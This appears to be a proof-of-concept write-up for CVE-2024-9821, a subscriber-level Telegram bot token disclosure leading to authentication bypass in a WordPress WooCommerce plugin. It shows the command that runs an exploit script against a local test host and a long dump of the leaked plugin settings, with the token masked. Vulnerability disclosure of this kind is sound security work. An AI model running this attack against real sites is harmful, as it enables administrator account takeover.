# CVE-2024-9821
Bot for Telegram on WooCommerce &lt;= 1.2.4 - Authenticated (Subscriber+) Telegram Bot Token Disclosure to Authentication Bypass

# Description
The Bot for Telegram on WooCommerce plugin for WordPress is vulnerable to sensitive information disclosure due to missing authorization checks on the 'stm_wpcfto_get_settings' AJAX action in all versions up to, and including, 1.2.4. This makes it possible for authenticated attackers, with subscriber-level access and above, to view the Telegram Bot Token, a secret token used to control the bot, which can then be used to log in as any existing user on the site, such as an administrator, if they know the username, due to the Login with Telegram feature.

```
Type: plugin
CVSS Score: 8.8
CVE: CVE-2024-9821
```
* Slug: [bot-for-telegram-on-woocommerce](https://wordpress.org/plugin/bot-for-telegram-on-woocommerce)
* Download Link: [Download bot-for-telegram-on-woocommerce Version 1.2.4](https://downloads.wordpress.org/plugin/bot-for-telegram-on-woocommerce.zip)


POC
---

```
python3 CVE-2024-9821.py -u http://kubernetes.docker.internal -un user -p user
```

```
Vulnerability check: http://kubernetes.docker.internal
Logged in successfully.
{   'bot_settings': {   'fields': {   'bftow_bot_api': {   'label': 'Telegram '
                                                                    'Bot Token',
                                                           'type': 'text',
                                                           'value': '8164783304:Axxxxxxxxxxxxxxxxxxxxxxxxxx'},
                                      'bftow_bot_name': {   'description': 'Set '
                                                                           'if '
                                                                           'you '
                                                                           'want '
                                                                           'user '
                                                                           'to '
                                                                           'get '
                                                                           'back '
                                                                           'to '
                                                                           'Telegram '
                                                                           'after '
                                                                           'successful '
                                                                           'checkout. '
                                                                           '(Without '
                                                                           '&quot;@&quot;)',
                                                            'label': 'Telegram '
                                                                     'Bot Name',
                                                            'type': 'text',
                                                            'value': 'Superbotman'},
                                      'bftow_buttons': {   'description': 'Save '
                                                                          'BOT '
                                                                          'Token '
                                                                          'first',
                                                           'label': 'Activate '
                                                                    'API URL',
                                                           'type': 'bftow_webhook_activation',
                                                           'value': ''},
                                      'bftow_google_maps_api_key': {   'description': '<a '
                                                                                      'href="https://developers.google.com/maps/documentation/geocoding/overview">Provide '
                                                                                      'Google '
                                                                                      'Maps '
                                                                                      'API '
                                                                                      'key</a> '
                                                                                      'with '
                                                                                      'enabled '
                                                                                      'geocoding '
                                                                                      'API '
                                                                                      'and '
                                                                                      'configured '
                                                                                      'billing '
                                                                                      'account. '
                                                                                      'If '
                                                                                      'you '
                                                                                      'leave '
                                                                                      'this '
                                                                                      'field '
                                                                                      'empty, '
                                                                                      'the '
                                                                                      'location '
                                                                                      'will '
                                                                                      'be '
                                                                                      'taken '
                                                                                      'via '
                                                                                      'openstreetmap',
                                                                       'label': 'Google '
                                                                                'Maps '
                                                                                'API '
                                                                                'key',
                                                                       'pro': True,
                                                                       'type': 'text',
                                                                       'value': ''},
                                      'bftow_proxy_server': {   'label': 'Proxy '
                                                                         'server',
                                                                'type': 'text',
                                                                'value': 'https://api.telegram.org/bot'}},
                        'name': 'BOT API Settings'},
    'interface_settings': {   'fields': {   'bftow_cart_on_site': {   'description': 'if '
                                                                                     'enabled '
                                                                                     'and '
                                                                                     'the '
                                                                                     'checkout '
                                                                                     'occurs '
                                                                                     'on '
                                                                                     'the '
                                                                                     'site, '
                                                                                     'when '
                                                                                     'clicking '
                                                                                     'on '
                                                                                     '&quot;checkout&quot; '
                                                                                     'button '
                                                                                     'the '
                                                                                     'user '
                                                                                     'will '
                                                                                     'be '
                                                                                     'redirected '
                                                                                     'to '
                                                                                     'the '
                                                                                     'cart '
                                                                                     'page',
                                                                      'label': 'Cart '
                                                                               'page '
                                                                               'instead '
                                                                               'checkout '
                                                                               'page',
                                                                      'type': 'checkbox',
                                                                      'value': ''},
                                            'bftow_category_per_row': {   'label': 'Categories '
                                                                                   'per '
                                                                                   'row',
                                                                          'options': {   '1': 1,
                                                                                         '2': 2,
                                                                                         '3': 3},
                                                                          'type': 'select',
                                                                          'value': 2},
                                            'bftow_disable_quantity_input': {   'label': 'Disable '
                                                                                         'quantity '
                                                                                         'input',
                                                                                'type': 'checkbox',
                                                                                'value': ''},
                                            'bftow_disable_site_checkout': {   'description': 'Disable '
                                                                                              'checkout '
                                                                                              'on '
                                                                                              'the '
                                                                                              'site, '
                                                                                              'the '
                                                                                              'order '
                                                                                              'will '
                                                                                              'be '
                                                                                              'created '
                                                                                              'automatically, '
                                                                                              'and '
                                                                                              'the '
                                                                                              'administrator '
                                                                                              'will '
                                                                                              'receive '
                                                                                              'a '
                                                                                              'notification '
                                                                                              'about '
                                                                                              'it',
                                                                               'label': 'Disable '
                                                                                        'checkout',
                                                                               'pro': True,
                                                                               'type': 'checkbox',
                                                                               'value': ''},
                                            'bftow_enable_fast_checkout': {   'label': 'Enable '
                                                                                       'fast '
                                                                                       'checkout',
                                                                              'type': 'checkbox',
                                                                              'value': ''},
                                            'bftow_enable_search': {   'label': 'Enable '
                                                                                'Search',
                                                                       'pro': True,
                                                                       'type': 'checkbox',
                                                                       'value': 'Enable '
                                                                                'Search'},
                                            'bftow_hide_account_button': {   'label': 'Hide '
                                                                                      'my '
                                                                                      'account '
                                                                                      'button',
                                                                             'pro': True,
                                                                             'type': 'checkbox',
                                                                             'value': ''},
                                            'bftow_hide_cart_button': {   'label': 'Hide '
                                                                                   'cart '
                                                                                   'button',
                                                                          'type': 'checkbox',
                                                                          'value': ''},
                                            'bftow_hide_shop_button': {   'label': 'Hide '
                                                                                   'shop '
                                                                                   'button',
                                                                          'pro': True,
                                                                          'type': 'checkbox',
                                                                          'value': ''},
                                            'bftow_hierarchy_categories': {   'description': 'When '
                                                                                             'you '
                                                                                             'select '
                                                                                             'a '
                                                                                             'category, '
                                                                                             'the '
                                                                                             'child '
                                                                                             'categories '
                                                                                             'will '
                                                                                             'be '
                                                                                             'displayed',
                                                                              'label': 'Show '
                                                                                       'categories '
                                                                                       'in '
                                                                                       'hierarchy',
                                                                              'pro': True,
                                                                              'type': 'checkbox',
                                                                              'value': ''},
                                            'bftow_product_category_buttons': {   'fields': {   'category_row': {   'fields': {   'category': {   'label': 'Select '
                                                                                                                                                           'category',
                                                                                                                                                  'options': {   'albums;Albums': 'Albums',
                                                                                                                                                                 'all;All products': 'All '
                                                                                                                                                                                     'products',
                                                                                                                                                                 'clothing;Clothing': 'Clothing',
                                                                                                                                                                 'hoodies;Hoodies': 'Hoodies',
                                                                                                                                                                 'music;Music': 'Music',
                                                                                                                                                                 'posters;Posters': 'Posters',
                                                                                                                                                                 'singles;Singles': 'Singles',
                                                                                                                                                                 't-shirts;T-shirts': 'T-shirts'},
                                                                                                                                                  'type': 'select'}},
                                                                                                                    'label': 'Category',
                                                                                                                    'type': 'repeater'}},
                                                                                  'label': 'Category '
                                                                                           'row',
                                                                                  'pro': True,
                                                                                  'type': 'repeater',
                                                                                  'value': ''},
                                            'bftow_request_location': {   'label': 'Request '
                                                                                   'location',
                                                                          'pro': True,
                                                                          'type': 'checkbox',
                                                                          'value': ''},
                                            'bftow_request_location_every_order': {   'label': 'Request '
                                                                                               'a '
                                                                                               'location '
                                                                                               'for '
                                                                                               'every '
                                                                                               'order',
                                                                                      'pro': True,
                                                                                      'type': 'checkbox',
                                                                                      'value': ''},
                                            'bftow_request_phone_number': {   'label': 'Request '
                                                                                       'phone '
                                                                                       'number',
                                                                              'type': 'checkbox',
                                                                              'value': ''},
                                            'bftow_show_checkout_button': {   'label': 'Show '
                                                                                       'checkout '
                                                                                       'button',
                                                                              'type': 'checkbox',
                                                                              'value': ''},
                                            'bftow_show_excerpt': {   'label': 'Show '
                                                                               'product '
                                                                               'short '
                                                                               'description',
                                                                      'type': 'checkbox',
                                                                      'value': ''},
                                            'bftow_show_only_parent_categories': {   'label': 'Show '
                                                                                              'only '
                                                                                              'parent '
                                                                                              'categories',
                                                                                     'type': 'checkbox',
                                                                                     'value': ''},
                                            'bftow_show_out_of_stock': {   'label': 'Show '
                                                                                    'out '
                                                                                    'of '
                                                                                    'stock '
                                                                                    'products',
                                                                           'pro': True,
                                                                           'type': 'checkbox',
                                                                           'value': ''},
                                            'bftow_show_sku': {   'label': 'Show '
                                                                           'SKU',
                                                                  'type': 'checkbox',
                                                                  'value': ''},
                                            'bftow_user_created_notification': {   'label': 'Notify '
                                                                                            'when '
                                                                                            'user '
                                                                                            'is '
                                                                                            'created',
                                                                                   'pro': True,
                                                                                   'type': 'checkbox',
                                                                                   'value': True}},
                              'name': 'Interface'},
    'keyboard': {   'fields': {   'keyboard': {   'fields': {   'button_text': {   'label': 'Button '
                                                                                            'text',
                                                                                   'type': 'text'},
                                                                'command': {   'description': 'Optional. '
                                                                                              'Enter '
                                                                                              'telegram '
                                                                                              'command. '
                                                                                              'e.g. '
                                                                                              '/faq',
                                                                               'label': 'Command',
                                                                               'type': 'text'},
                                                                'message_image': {   'label': 'Message '
                                                                                              'Image',
                                                                                     'type': 'image'},
                                                                'message_text': {   'label': 'Message',
                                                                                    'type': 'editor'},
                                                                'web_app_url': {   'label': 'Web '
                                                                                            'App '
                                                                                            'URL',
                                                                                   'type': 'text'}},
                                                  'label': 'Custom Button',
                                                  'pro': True,
                                                  'type': 'repeater',
                                                  'value': ''}},
                    'name': 'Keyboard'},
    'messages_settings': {   'fields': {   'bftow_account_button_text': {   'label': 'My '
                                                                                     'account '
                                                                                     'button '
                                                                                     'text',
                                                                            'pro': True,
                                                                            'type': 'text',
                                                                            'value': 'My '
                                                                                     'account'},
                                           'bftow_account_message': {   'label': 'My '
                                                                                 'account '
                                                                                 'message',
                                                                        'pro': True,
                                                                        'type': 'text',
                                                                        'value': 'My '
                                                                                 'account:'},
                                           'bftow_add_to_cart_btn_title': {   'label': 'Add '
                                                                                       'to '
                                                                                       'cart '
                                                                                       'button '
                                                                                       'text',
                                                                              'type': 'text',
                                                                              'value': 'Add '
                                                                                       'to '
                                                                                       'Cart'},
                                           'bftow_added_to_cart': {   'label': 'Added '
                                                                               'to '
                                                                               'cart '
                                                                               'text',
                                                                      'type': 'text',
                                                                      'value': 'added '
                                                                               'to '
                                                                               'cart'},
                                           'bftow_all_product': {   'label': 'All '
                                                                             'products '
                                                                             'text',
                                                                    'type': 'text',
                                                                    'value': 'All '
                                                                             'products'},
                                           'bftow_buy_now_btn_text': {   'label': 'Buy '
                                                                                  'Now '
                                                                                  'button '
                                                                                  'text',
                                                                         'type': 'text',
                                                                         'value': 'Buy '
                                                                                  'Now'},
                                           'bftow_cart_btn_title': {   'label': 'Title '
                                                                                'Button '
                                                                                'Cart',
                                                                       'type': 'text',
                                                                       'value': 'Cart'},
                                           'bftow_cart_empty': {   'label': 'Cart '
                                                                            'empty '
                                                                            'Message',
                                                                   'type': 'text',
                                                                   'value': 'Cart '
                                                                            'empty'},
                                           'bftow_checkout_btn_title': {   'label': 'Title '
                                                                                    'Button '
                                                                                    'Checkout',
                                                                           'type': 'text',
                                                                           'value': 'Checkout'},
                                           'bftow_hello_title': {   'label': 'Hello '
                                                                             'Message',
                                                                    'type': 'text',
                                                                    'value': 'Hello! '
                                                                             'Welcome '
                                                                             'to '
                                                                             'WooCommerce '
                                                                             'Telegram '
                                                                             'Store'},
                                           'bftow_info_updated': {   'label': 'Information '
                                                                              'updated '
                                                                              'message',
                                                                     'type': 'text',
                                                                     'value': 'Information '
                                                                              'updated'},
                                           'bftow_main_menu_button_text': {   'label': 'Main '
                                                                                       'menu '
                                                                                       'button '
                                                                                       'text',
                                                                              'pro': True,
                                                                              'type': 'text',
                                                                              'value': 'Main '
                                                                                       'menu'},
                                           'bftow_no_orders_found': {   'label': 'No '
                                                                                 'orders '
                                                                                 'found '
                                                                                 'message',
                                                                        'pro': True,
                                                                        'type': 'text',
                                                                        'value': 'No '
                                                                                 'orders '
                                                                                 'found'},
                                           'bftow_not_found_text': {   'label': 'Not '
                                                                                'found '
                                                                                'message',
                                                                       'pro': True,
                                                                       'type': 'text',
                                                                       'value': 'Products '
                                                                                'not '
                                                                                'found'},
                                           'bftow_orders_button_text': {   'label': 'Order '
                                                                                    'Button '
                                                                                    'text',
                                                                           'pro': True,
                                                                           'type': 'text',
                                                                           'value': 'My '
                                                                                    'orders'},
                                           'bftow_out_of_stock_button': {   'label': 'Out '
                                                                                     'of '
                                                                                     'stock '
                                                                                     'button '
                                                                                     'text',
                                                                            'type': 'text',
                                                                            'value': 'Out '
                                                                                     'of '
                                                                                     'stock'},
                                           'bftow_price_text': {   'label': '&quot;Price:&quot; '
                                                                            'text',
                                                                   'type': 'text',
                                                                   'value': 'Price:'},
                                           'bftow_proceed_checkout_btn_title': {   'label': 'Title '
                                                                                            'Button '
                                                                                            'Proceed '
                                                                                            'To '
                                                                                            'Checkout',
                                                                                   'type': 'text',
                                                                                   'value': 'Proceed '
                                                                                            'to '
                                                                                            'Checkout'},
                                           'bftow_prod_not_added': {   'label': 'Product '
                                                                                'not '
                                                                                'added '
                                                                                'text',
                                                                       'type': 'text',
                                                                       'value': 'Product '
                                                                                'not '
                                                                                'added'},
                                           'bftow_remove_btn_title': {   'label': 'Title '
                                                                                  'Button '
                                                                                  'Remove',
                                                                         'type': 'text',
                                                                         'value': 'Remove'},
                                           'bftow_search_button_text': {   'label': 'Search '
                                                                                    'Button '
                                                                                    'Text',
                                                                           'pro': True,
                                                                           'type': 'text',
                                                                           'value': 'Search'},
                                           'bftow_search_result_button_text': {   'label': 'Search '
                                                                                           'result '
                                                                                           'button '
                                                                                           'text',
                                                                                  'pro': True,
                                                                                  'type': 'text',
                                                                                  'value': 'Show '
                                                                                           'results'},
                                           'bftow_select_cat': {   'label': 'Select '
                                                                            'category '
                                                                            'text',
                                                                   'type': 'text',
                                                                   'value': 'Select '
                                                                            'category:'},
                                           'bftow_share_number': {   'label': 'Share '
                                                                              'number '
                                                                              'Message',
                                                                     'type': 'text',
                                                                     'value': 'Share '
                                                                              'phone '
                                                                              'number'},
                                           'bftow_shop_btn_title': {   'label': 'Title '
                                                                                'Button '
                                                                                'Shop',
                                                                       'type': 'text',
                                                                       'value': 'Shop'},
                                           'bftow_sku_text': {   'label': 'SKU '
                                                                          'Message',
                                                                 'type': 'text',
                                                                 'value': 'SKU'},
                                           'bftow_text_after_search': {   'label': 'Message '
                                                                                   'after '
                                                                                   'search '
                                                                                   'button',
                                                                          'pro': True,
                                                                          'type': 'text',
                                                                          'value': 'Enter '
                                                                                   'a '
                                                                                   'search '
                                                                                   'word'},
                                           'bftow_total_text': {   'label': 'Total '
                                                                            'button '
                                                                            'text',
                                                                   'type': 'text',
                                                                   'value': 'Total:'},
                                           'bftow_update_location_button_text': {   'label': 'Send '
                                                                                             'location '
                                                                                             'button '
                                                                                             'text',
                                                                                    'pro': True,
                                                                                    'type': 'text',
                                                                                    'value': 'Send '
                                                                                             'location'},
                                           'bftow_update_phone_button_text': {   'label': 'Update '
                                                                                          'phone '
                                                                                          'button '
                                                                                          'text',
                                                                                 'pro': True,
                                                                                 'type': 'text',
                                                                                 'value': 'Update '
                                                                                          'phone'},
                                           'bftow_your_cart': {   'label': 'Your '
                                                                           'cart '
                                                                           'text',
                                                                  'type': 'text',
                                                                  'value': 'Your '
                                                                           'cart'},
                                           'bftow_your_orders': {   'label': 'Your '
                                                                             'orders '
                                                                             'message',
                                                                    'pro': True,
                                                                    'type': 'text',
                                                                    'value': 'Your '
                                                                             'orders'}},
                             'name': 'Messages'},
    'notification_settings': {   'fields': {   'bftow_notification_channel_id': {   'label': 'Get '
                                                                                             'Private '
                                                                                             'Channel '
                                                                                             'ID '
                                                                                             'for '
                                                                                             'Notifications',
                                                                                    'pro': True,
                                                                                    'type': 'bftow_notification_channel_id',
                                                                                    'value': ''}},
                                 'name': 'Notification Settings'},
    'tg_login': {   'fields': {   'enable_tg_login': {   'description': 'Send '
                                                                        'the '
                                                                        '/setdomain '
                                                                        'command '
                                                                        'to <a '
                                                                        'href="https://t.me/BotFather" '
                                                                        'target="_blank">@Botfather</a> '
                                                                        'choose '
                                                                        'your '
                                                                        'bot, '
                                                                        'after '
                                                                        'that '
                                                                        'send '
                                                                        'kubernetes.docker.internal',
                                                         'label': 'Enable '
                                                                  'Telegram '
                                                                  'Login',
                                                         'type': 'checkbox',
                                                         'value': True},
                                  'login_button_on_woo_checkout': {   'dependency': {   'key': 'enable_tg_login',
                                                                                        'value': 'empty'},
                                                                      'dependency_mode': 'disabled',
                                                                      'description': 'You '
                                                                                     'have '
                                                                                     'to '
                                                                                     'enable '
                                                                                     '&quot;Allow '
                                                                                     'customers '
                                                                                     'to '
                                                                                     'create '
                                                                                     'an '
                                                                                     'account '
                                                                                     'during '
                                                                                     'checkout&quot; '
                                                                                     'option',
                                                                      'label': 'Add '
                                                                               'Login '
                                                                               'button '
                                                                               'on '
                                                                               'WooCommerce '
                                                                               'Checkout '
                                                                               'Form',
                                                                      'type': 'checkbox',
                                                                      'value': ''},
                                  'login_button_on_woo_login': {   'dependency': {   'key': 'enable_tg_login',
                                                                                     'value': 'empty'},
                                                                   'dependency_mode': 'disabled',
                                                                   'label': 'Add '
                                                                            'Login '
                                                                            'button '
                                                                            'on '
                                                                            'WooCommerce '
                                                                            'Login '
                                                                            'Form',
                                                                   'type': 'checkbox',
                                                                   'value': ''},
                                  'login_button_on_woo_register': {   'dependency': {   'key': 'enable_tg_login',
                                                                                        'value': 'empty'},
                                                                      'dependency_mode': 'disabled',
                                                                      'label': 'Add '
                                                                               'Login '
                                                                               'button '
                                                                               'on '
                                                                               'WooCommerce '
                                                                               'Register '
                                                                               'Form',
                                                                      'type': 'checkbox',
                                                                      'value': ''},
                                  'login_button_on_wp_login': {   'dependency': {   'key': 'enable_tg_login',
                                                                                    'value': 'empty'},
                                                                  'dependency_mode': 'disabled',
                                                                  'label': 'Add '
                                                                           'Login '
                                                                           'button '
                                                                           'on '
                                                                           'WordPress '
                                                                           'Login '
                                                                           'Form',
                                                                  'type': 'checkbox',
                                                                  'value': ''},
                                  'login_button_on_wp_register': {   'dependency': {   'key': 'enable_tg_login',
                                                                                       'value': 'empty'},
                                                                     'dependency_mode': 'disabled',
                                                                     'label': 'Add '
                                                                              'Login '
                                                                              'button '
                                                                              'on '
                                                                              'WordPress '
                                                                              'Register '
                                                                              'Form',
                                                                     'type': 'checkbox',
                                                                     'value': ''},
                                  'login_button_size': {   'dependency': {   'key': 'enable_tg_login',
                                                                             'value': 'empty'},
                                                           'dependency_mode': 'disabled',
                                                           'label': 'Button '
                                                                    'size',
                                                           'options': {   'large': 'Large',
                                                                          'medium': 'Medium',
                                                                          'small': 'Small'},
                                                           'type': 'radio',
                                                           'value': 'large'},
                                  'login_corner_radius': {   'dependency': {   'key': 'enable_tg_login',
                                                                               'value': 'empty'},
                                                             'dependency_mode': 'disabled',
                                                             'label': 'Corner '
                                                                      'Radius',
                                                             'options': {   'custom': 'Custom',
                                                                            'default': 'Default'},
                                                             'type': 'radio',
                                                             'value': 'default'},
                                  'login_custom_corner_radius': {   'dependency': {   'key': 'login_corner_radius',
                                                                                      'value': 'custom'},
                                                                    'label': 'Corner '
                                                                             'Radius',
                                                                    'type': 'number',
                                                                    'value': '20'},
                                  'login_redirect': {   'dependency': {   'key': 'enable_tg_login',
                                                                          'value': 'empty'},
                                                        'dependency_mode': 'disabled',
                                                        'label': 'Redirect '
                                                                 'page after '
                                                                 'login',
                                                        'options': {   'account': 'WooCommerce '
                                                                                  'Account '
                                                                                  'Page',
                                                                       'current_page': 'Current '
                                                                                       'Page',
                                                                       'custom': 'Custom '
                                                                                 'URL',
                                                                       'home_page': 'Home '
                                                                                    'Page'},
                                                        'type': 'radio',
                                                        'value': 'current_page'},
                                  'login_redirect_url': {   'dependency': {   'key': 'login_redirect',
                                                                              'value': 'custom'},
                                                            'label': 'Redirect '
                                                                     'URL',
                                                            'type': 'text',
                                                            'value': 'http://kubernetes.docker.internal'},
                                  'login_show_photo': {   'dependency': {   'key': 'enable_tg_login',
                                                                            'value': 'empty'},
                                                          'dependency_mode': 'disabled',
                                                          'label': 'Show User '
                                                                   'Photo',
                                                          'type': 'checkbox',
                                                          'value': ''}},
                    'name': 'Telegram Login Settings'}}
```
